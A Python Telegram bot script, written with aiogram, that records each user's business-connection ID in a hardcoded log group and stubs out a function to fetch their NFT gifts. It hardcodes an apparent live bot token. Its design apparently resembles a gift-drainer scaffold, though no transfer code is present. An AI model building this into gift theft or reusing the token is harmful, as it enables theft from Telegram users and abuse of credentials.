import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.methods import GetBusinessConnection
from aiogram.exceptions import TelegramAPIError

# Configuration
API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613

# Initialize
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

async def fetch_nft_gifts_from_api(business_connection_id: str):
    """Fetch NFT gifts using direct API request"""
    try:
        # In production, replace this with:
        # 1. Direct Telegram API call using aiohttp
        # 2. Or blockchain integration (Web3, Moralis, etc.)
        # For now returns empty list since method isn't available
        return []
        
    except Exception as e:
        logging.error(f"API Error: {e}")
        return []

async def log_connection_with_gifts(user: types.User, connection_id: str):
    """Log connection and attempt to fetch gifts"""
    try:
        # Get business connection details
        connection = await bot(GetBusinessConnection(
            business_connection_id=connection_id
        ))
        
        # Try to fetch NFT gifts
        nft_gifts = await fetch_nft_gifts_from_api(connection_id)
        
        # Prepare log message
        gift_info = "\n".join(
            f"• {gift['name']}" 
            for gift in nft_gifts[:3]  # Show first 3 if available
        ) if nft_gifts else "No NFT gifts found"
        
        await bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"🎁 <b>Business Connection</b>\n\n"
                 f"👤 User: {user.mention_html()}\n"
                 f"🔗 Connection ID: <code>{connection_id}</code>\n\n"
                 f"🖼 <b>NFT Gifts:</b>\n{gift_info}",
            parse_mode=ParseMode.HTML
        )
        
    except TelegramAPIError as e:
        logging.error(f"Connection error: {e}")

@dp.business_connection()
async def handle_business_connection(bc: types.BusinessConnection):
    """Handle new business connections"""
    try:
        await log_connection_with_gifts(bc.user, bc.id)
        
        if bc.can_reply:
            await bot.send_message(
                chat_id=bc.user.id,
                text="🌟 Welcome to NFT Gift Bot\n\n"
                     "We'll fetch your NFT gifts when available",
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        logging.error(f"Error: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    asyncio.run(main())
